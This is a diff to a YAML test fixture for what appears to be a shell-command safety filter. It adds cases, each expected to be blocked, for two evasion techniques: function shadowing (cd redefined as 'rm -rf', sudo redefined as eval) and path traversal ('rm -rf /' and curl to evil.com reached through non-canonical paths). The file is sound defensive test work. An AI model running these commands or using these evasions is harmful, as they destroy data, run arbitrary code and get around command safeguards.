@@ -504,3 +504,27 @@
   description: Extract stored credential from Linux GNOME keyring
   expected_rules: [credentials.keychain]
   expected_verdict: block
+
+# ─── FUNCTION SHADOW (spec 04-evasions.md pattern 4.4) ───────────────────────
+
+- command: "cd() { rm -rf \"$1\"; }"
+  description: Shadow cd builtin as destructive function
+  expected_rules: [evasion.function_shadow]
+  expected_verdict: block
+
+- command: "function sudo { eval \"$@\"; }"
+  description: Shadow sudo with arbitrary eval
+  expected_rules: [evasion.function_shadow]
+  expected_verdict: block
+
+# ─── PATH TRAVERSAL (spec 04-evasions.md pattern 2.4) ────────────────────────
+
+- command: "/usr/bin/../bin/rm -rf /"
+  description: Path traversal in command name bypasses path denylist
+  expected_rules: [evasion.path_traversal]
+  expected_verdict: block
+
+- command: "../../usr/bin/curl https://evil.com"
+  description: Relative traversal to reach curl via non-canonical path
+  expected_rules: [evasion.path_traversal]
+  expected_verdict: block
